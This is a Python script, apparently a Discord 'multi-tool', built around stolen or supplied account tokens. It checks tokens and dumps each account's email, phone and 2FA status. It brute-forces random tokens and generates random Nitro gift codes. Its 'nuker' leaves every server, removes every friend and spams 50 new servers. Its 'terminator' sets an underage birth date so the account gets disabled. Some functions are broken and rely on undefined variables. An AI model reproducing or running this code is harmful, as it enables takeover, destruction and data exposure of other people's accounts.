# -*- coding: utf-8 -*-

from colorama import Fore, init
import subprocess, requests, ctypes, os, webbrowser, pyfiglet
from pathlib import Path
import random, string
from requests import Session
print(Fore.RED + '\n -- ' + Fore.WHITE + 'Loading...')
os.system('cls')

def badges(token):
    while True:
        url = 'https://discord.com/api/v6/hypesquad/online'
        option = str(input('[1] Hypersquad Bravery\n[2] Hypersquad Brilliance\n[3] Hypersquad Balance\n\n> Select a Discord Badge: '))
        if option in ('1', 'Hypersquad Bravery', 'House of Bravery', 'Bravery'):
            house_of_bravery = requests.post(url, json={'house_id': '1'}, headers={'authorization': token})
            if house_of_bravery.status_code == 204:
                print('> Status: Success | Type: Hypersquad Bravery\n')
            else:
                if house_of_bravery.status_code == 429:
                    rate_limited()
                else:
                    if house_of_bravery.status_code == 401:
                        invalid_token()
                        break
                    else:
                        print('%s\n' % house_of_bravery.text)
        elif option in ('2', 'Hypersquad Brilliance', 'House of Brilliance', 'Brilliance'):
            house_of_brilliance = requests.post(url, json={'house_id': '2'}, headers={'authorization': token})
            if house_of_brilliance.status_code == 204:
                print('> Status: Success | Type: Hypersquad Brilliance\n')
            else:
                if house_of_brilliance.status_code == 429:
                    rate_limited()
                else:
                    if house_of_brilliance.status_code == 401:
                        invalid_token()
                        break
                    else:
                        print('%s\n' % house_of_brilliance.text)
        elif option in ('3', 'Hypersquad Balance', 'House of Balance', 'Balance'):
            house_of_balance = requests.post(url, json={'house_id': '3'}, headers={'authorization': token})
            if house_of_balance.status_code == 204:
                print('> Status: Success | Type: Hypersquad Balance\n')
            else:
                if house_of_balance.status_code == 429:
                    rate_limited()
                else:
                    if house_of_balance.status_code == 401:
                        invalid_token()
                        break
                    else:
                        print('%s\n' % house_of_balance.text)
        else:
            print('> Status: Error   | Invalid option\n')


def unverify(token):
    headers = {'Authorization': token}
    return requests.get('https://discord.com/api/v6/guilds/0/members', headers=headers)


def Nitrogen():
    init(convert=True)
    print(('%s how many codes?%s ' % (Fore.CYAN, Fore.WHITE)), end='')
    amount = int(input())
    for i in range(amount):
        code = 'https://discordapp.com/gifts/%s' % ''.join(random.choices((string.ascii_letters + string.digits), k=16))
        print('Code: %s' % code)
        with open('codes.txt', 'a') as (f):
            f.write('%s\n' % code)


def tokenDisable(token):
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2015-7-16'})
    if r.status_code == 400:
        print(f"[{Fore.RED}+{Fore.RESET}] Account disabled successfully")
        input('Press any key to exit...')
    else:
        print(f"[{Fore.RED}-{Fore.RESET}] Invalid token")
        input('Press any key to exit...')


def tokenFuck(token):
    headers = {'Authorization': token}
    print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")
    for guild in guildsIds:
        requests.delete(f"https://discord.com/api/v6/users/@me/guilds/{guild}", headers=headers)
    else:
        for friend in friendsIds:
            requests.delete(f"https://discord.com/api/v6/users/@me/relationships/{friend}", headers=headers)
        else:
            for i in range(50):
                payload = {'name':f"JAJAJA {i}",
                 'region':'europe',  'icon':None,  'channels':None}
                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
            else:
                modes = cycle(['light', 'dark'])
                while True:
                    setting = {'theme':next(modes),
                     'locale':random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
                    requests.patch('https://discord.com/api/v6/users/@me/settings', headers=headers, json=setting)


def tokengen():
    chars = '-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
    ascii_banner = pyfiglet.figlet_format('Token  generator')
    print(ascii_banner)
    file_path = Path('tokens.txt')
    ilosc = input('How many tokens to generate: \n')
    ilosc = int(ilosc)
    os.system('cls')
    print('Generating working tokens.....')
    print('Please wait')
    working = '[WORK] '
    err = '[ERROR] '
    for i in range(ilosc):
        token1 = ''
        token2 = ''
        for c in range(84):
            token1 += random.choice(chars)
        else:
            token2 = 'mfa.'
            token1 = str(token1)
            token2 = str(token2)
            token = token1 + token2
            headers = {'Authorization': token}
            src = requests.get('https://discord.com/api/v6/auth/login', headers=headers)
            try:
                if src.status_code == 200:
                    workingtoken = working + token
                    print(workingtoken)
                else:
                    print(f"Invalid Token {token}")
            except Exception:
                print("Yeah we can't contact discordapp.com")


def tokencheck(token):
    headers = {'Authorization':token,
     'Content-Type':'application/json'}
    src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
    try:
        if src.status_code == 200:
            print('Token Works!')
        else:
            print('Invalid Token.')
    except Exception:
        print("Yeah we can't contact discordapp.com")


def tokenInfo(token):
    headers = {'Authorization':token,
     'Content-Type':'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f"\n            [{Fore.RED}User ID{Fore.RESET}]         {userID}\n            [{Fore.RED}User Name{Fore.RESET}]       {userName}\n            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}\n            [{Fore.RED}Email{Fore.RESET}]           {email}\n            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ''}\n            [{Fore.RED}Token{Fore.RESET}]           {token}\n            ")
        input()


def three():
    print(getBanner3())
    print(f"[{Fore.RED}>{Fore.RESET}] Your choice", end='')
    choice = str(input('  :  '))
    if choice == '1':
        os.system('cls')
        print(f"[{Fore.RED}>{Fore.RESET}] Account token", end='')
        token = input('  :  ')
        unverify(token)
    else:
        if choice == '2':
            os.system('cls')
            print(f"[{Fore.RED}>{Fore.RESET}] Account token", end='')
            token = input('  :  ')
            badges(token)


def two():
    print(getBanner2())
    print(f"[{Fore.RED}>{Fore.RESET}] Your choice", end='')
    choice = str(input('  :  '))
    if choice == '1':
        os.system('cls')
        print('Error not finnished')
    else:
        if choice == '2':
            os.system('cls')
            Nitrogen()


def one():
    print(getBanner1())
    print(f"[{Fore.RED}>{Fore.RESET}] Your choice", end='')
    choice = str(input('  :  '))
    if choice == '1':
        os.system('cls')
        print(f"[{Fore.RED}>{Fore.RESET}] Account token", end='')
        token = input('  :  ')
        tokencheck(token)
    else:
        if choice == '2':
            os.system('cls')
            print(f"[{Fore.RED}>{Fore.RESET}] Account token", end='')
            token = input('  :  ')
            tokenInfo(token)
        else:
            if choice == '3':
                os.system('cls')
                tokengen()
            else:
                if choice == '4':
                    os.system('cls')
                    print(f"[{Fore.RED}>{Fore.RESET}] Account token", end='')
                    token = input('  :  ')
                    tokenFuck(token)
                else:
                    if choice == '5':
                        os.system('cls')
                        print(f"[{Fore.RED}>{Fore.RESET}] Account token", end='')
                        token = input('  :  ')
                        tokenDisable(token)


def getBanner3():
    banner3 = f"\n\n            ██╗   ██╗██╗███████╗ █████╗ ██████╗ ██╗   ██╗\n            ██║   ██║██║██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝\n            ██║   ██║██║███████╗███████║██████╔╝ ╚████╔╝ \n            ╚██╗ ██╔╝██║╚════██║██╔══██║██╔══██╗  ╚██╔╝  \n             ╚████╔╝ ██║███████║██║  ██║██║  ██║   ██║   \n              ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝\n                        Misc commands\n            [{Fore.RED}1[+]{Fore.RESET}] Unverify email\n            [{Fore.RED}2[+]{Fore.RESET}] change hypesquad\n\n    ".replace('░', f"{Fore.RED}░{Fore.RESET}")
    return banner3


def getBanner2():
    banner2 = f"\n\n            ██╗   ██╗██╗███████╗ █████╗ ██████╗ ██╗   ██╗\n            ██║   ██║██║██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝\n            ██║   ██║██║███████╗███████║██████╔╝ ╚████╔╝ \n            ╚██╗ ██╔╝██║╚════██║██╔══██║██╔══██╗  ╚██╔╝  \n             ╚████╔╝ ██║███████║██║  ██║██║  ██║   ██║   \n              ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝\n                        Nitro commands\n            \n            [{Fore.RED}1[+]{Fore.RESET}] Nitro checker(not done)\n            [{Fore.RED}2[+]{Fore.RESET}] Nitro Generator\n\n    ".replace('░', f"{Fore.RED}░{Fore.RESET}")
    return banner2


def getBanner1():
    banner1 = f"\n\n            ██╗   ██╗██╗███████╗ █████╗ ██████╗ ██╗   ██╗\n            ██║   ██║██║██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝\n            ██║   ██║██║███████╗███████║██████╔╝ ╚████╔╝ \n            ╚██╗ ██╔╝██║╚════██║██╔══██║██╔══██╗  ╚██╔╝  \n             ╚████╔╝ ██║███████║██║  ██║██║  ██║   ██║   \n              ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝\n                        Token commands\n            [{Fore.RED}1[+]{Fore.RESET}] Token checker\n            [{Fore.RED}2[+]{Fore.RESET}] Token info\n            [{Fore.RED}3[+]{Fore.RESET}] Token Generator\n            [{Fore.RED}4[+]{Fore.RESET}] Token Nuker\n            [{Fore.RED}5[+]{Fore.RESET}] Token Terminator\n\n\n    ".replace('░', f"{Fore.RED}░{Fore.RESET}")
    return banner1


def getBanner():
    banner = f"\n\n\n            Made by REZIZT. \n            Discord : https://discord.gg/6GYVCq9\n\n            ██╗   ██╗██╗███████╗ █████╗ ██████╗ ██╗   ██╗\n            ██║   ██║██║██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝\n            ██║   ██║██║███████╗███████║██████╔╝ ╚████╔╝ \n            ╚██╗ ██╔╝██║╚════██║██╔══██║██╔══██╗  ╚██╔╝  \n             ╚████╔╝ ██║███████║██║  ██║██║  ██║   ██║   \n              ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   \n\n            [{Fore.RED}1[+]{Fore.RESET}] Token commands\n            [{Fore.RED}2[+]{Fore.RESET}] Nitro commands\n            [{Fore.RED}3[+]{Fore.RESET}] Misc commands\n\n\n    ".replace('░', f"{Fore.RED}░{Fore.RESET}")
    return banner


def startMenu():
    print(getBanner())
    print(f"[{Fore.RED}>{Fore.RESET}] Your choice", end='')
    choice = str(input('  :  '))
    if choice == '1':
        os.system('cls')
        one()
    else:
        if choice == '2':
            os.system('cls')
            two()
        else:
            if choice == '3':
                os.system('cls')
                three()


if __name__ == '__main__':
    startMenu()